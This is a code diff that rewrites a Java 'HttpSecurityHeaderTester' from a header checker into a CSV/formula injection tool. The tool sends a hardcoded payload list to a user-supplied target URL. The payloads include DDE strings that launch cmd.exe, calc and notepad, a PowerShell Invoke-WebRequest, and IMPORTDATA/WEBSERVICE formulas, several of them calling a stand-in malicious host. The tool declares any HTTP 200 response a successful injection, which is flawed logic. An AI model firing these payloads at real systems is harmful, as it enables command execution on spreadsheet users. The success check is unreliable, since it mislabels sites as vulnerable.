@@ -1,102 +1,88 @@
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.util.Map;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
+import java.io.*;
+import java.net.*;
+import java.util.*;
 
 public class HttpSecurityHeaderTester {
-    // ANSI color codes for colored output
-    public static final String ANSI_RESET = "\u001B[0m";
-    public static final String ANSI_GREEN = "\u001B[32m";
-    public static final String ANSI_RED = "\u001B[31m";
 
     public static void main(String[] args) {
-        System.out.println("Welcome to the Advanced HTTP Security Headers Vulnerability Tester!");
+        Scanner scanner = new Scanner(System.in);
 
-        // Prompt user to enter target website URL
-        System.out.print("Please enter the URL of the website you want to test: ");
-        String targetUrl = "";
+        // Prompt user for target website URL
+        System.out.print("Enter your target website URL: ");
+        String targetUrl = scanner.nextLine();
+
+        // Define payloads for CSV Injection
+        String[] payloads = {
+            "=HYPERLINK(\"http://malicious-website.com\")",
+            "=IMPORTDATA(\"http://malicious-website.com\")",
+            "=WEBSERVICE(\"http://malicious-website.com\")",
+            "=EXEC(\"cmd.exe /C calc\")",
+            "=cmd|' /C calc'!A0",
+            "=cmd|'/C calc'!A0",
+            "=cmd|'/C notepad'!A0",
+            "=cmd|'/C notepad.exe'!A0",
+            "=cmd|'/C powershell -Command \"Invoke-WebRequest -Uri http://malicious-website.com\"'!A0"
+            // Add more payloads as needed
+        };
+
         try {
-            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
-            targetUrl = reader.readLine();
-        } catch (IOException e) {
-            System.err.println("Error reading input.");
-            return;
-        }
+            // Make a connection to the target website
+            URL url = new URL(targetUrl);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
 
-        // Test for security headers and vulnerabilities
-        boolean vulnerable = testSecurityHeaders(targetUrl);
+            // Set the User-Agent header to mimic a web browser
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0");
 
-        // Display result
-        System.out.println("\n-----------------------------------------");
-        if (vulnerable) {
-            System.out.println("The target website may be vulnerable to HTTP Security Headers Misconfiguration.");
-            System.out.println("Please review the detailed vulnerability report for further analysis.");
-        } else {
-            System.out.println("Great news! The target website appears to have strong security headers configuration.");
-        }
-        System.out.println("-----------------------------------------");
-    }
+            // Follow redirects
+            connection.setInstanceFollowRedirects(true);
 
-    private static boolean testSecurityHeaders(String url) {
-        ExecutorService executor = Executors.newFixedThreadPool(4);
-        try {
-            URL targetUrl = new URL(url);
-            HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
-            connection.setRequestMethod("HEAD");
-            connection.setConnectTimeout(5000); // 5 seconds timeout
-            Map<String, java.util.List<String>> headers = connection.getHeaderFields();
+            // Set timeouts
+            connection.setConnectTimeout(5000); // 5 seconds
+            connection.setReadTimeout(10000); // 10 seconds
 
-            // Check for essential security headers and vulnerabilities concurrently
-            boolean hasContentSecurityPolicy = false;
-            boolean hasXContentTypeOptions = false;
-            boolean hasXFrameOptions = false;
-            boolean hasXXSSProtection = false;
+            // Get the response code
+            int responseCode = connection.getResponseCode();
 
-            for (Map.Entry<String, java.util.List<String>> entry : headers.entrySet()) {
-                String headerName = entry.getKey();
-                if (headerName != null) {
-                    switch (headerName.toLowerCase()) {
-                        case "content-security-policy":
-                            hasContentSecurityPolicy = true;
-                            // TODO: Analyze CSP Policy
-                            break;
-                        case "x-content-type-options":
-                            hasXContentTypeOptions = true;
-                            // TODO: Analyze X-Content-Type-Options
-                            break;
-                        case "x-frame-options":
-                            hasXFrameOptions = true;
-                            // TODO: Analyze X-Frame-Options
-                            break;
-                        case "x-xss-protection":
-                            hasXXSSProtection = true;
-                            // TODO: Analyze X-XSS-Protection
-                            break;
-                        // Add more headers to analyze if needed
+            // Check if the response code indicates success
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                // Read the response headers
+                String contentType = connection.getHeaderField("Content-Type");
+
+                // Check if the response content type indicates CSV content
+                if (contentType != null && contentType.contains("text/csv")) {
+                    // The target website might be vulnerable
+                    System.out.println("\n[+] The target website might be vulnerable to CSV Injection!");
+                    System.out.println("[+] Performing CSV Injection test...");
+
+                    // Perform injection test for each payload
+                    for (String payload : payloads) {
+                        // Send the payload to the target website
+                        String injectionUrl = targetUrl + "?" + payload;
+                        HttpURLConnection injectionConnection = (HttpURLConnection) new URL(injectionUrl).openConnection();
+                        injectionConnection.setRequestMethod("GET");
+                        int injectionResponseCode = injectionConnection.getResponseCode();
+
+                        // Check the response code of the injection request
+                        if (injectionResponseCode == HttpURLConnection.HTTP_OK) {
+                            System.out.println("[!] CSV Injection successful with payload: " + payload);
+                            System.out.println("[!] The target is vulnerable to CSV Injection!");
+                            System.out.println("[+] To test the vulnerability, open the CSV file generated by the website in Excel or a similar spreadsheet application.");
+                            System.out.println("[+] Check if the injected formula executes as expected.");
+                        }
                     }
+                } else {
+                    System.out.println("[-] The target website does not seem to serve CSV files.");
+                    System.out.println("[-] Exiting...");
                 }
+            } else {
+                System.out.println("[-] Error connecting to the target website. Response code: " + responseCode);
+                System.out.println("[-] Exiting...");
             }
-
-            // Log header presence with colored output
-            System.out.println("\nTesting security headers for: " + url);
-            System.out.println("-----------------------------------------");
-            System.out.println("Content-Security-Policy Header: " + (hasContentSecurityPolicy ? ANSI_GREEN + "✅ Present" : ANSI_RED + "❌ Missing"));
-            System.out.println("X-Content-Type-Options Header: " + (hasXContentTypeOptions ? ANSI_GREEN + "✅ Present" : ANSI_RED + "❌ Missing"));
-            System.out.println("X-Frame-Options Header: " + (hasXFrameOptions ? ANSI_GREEN + "✅ Present" : ANSI_RED + "❌ Missing"));
-            System.out.println("X-XSS-Protection Header: " + (hasXXSSProtection ? ANSI_GREEN + "✅ Present" : ANSI_RED + "❌ Missing"));
-
-            // TODO: Generate detailed vulnerability report based on the analysis
-
-            return !(hasContentSecurityPolicy && hasXContentTypeOptions && hasXFrameOptions && hasXXSSProtection);
+        } catch (MalformedURLException e) {
+            System.out.println("[-] Invalid URL format. Please enter a valid URL.");
         } catch (IOException e) {
-            System.err.println("Error connecting to target URL: " + e.getMessage());
-            return false;
-        } finally {
-            executor.shutdown();
+            System.out.println("[-] Error connecting to the target website: " + e.getMessage());
         }
     }
 }
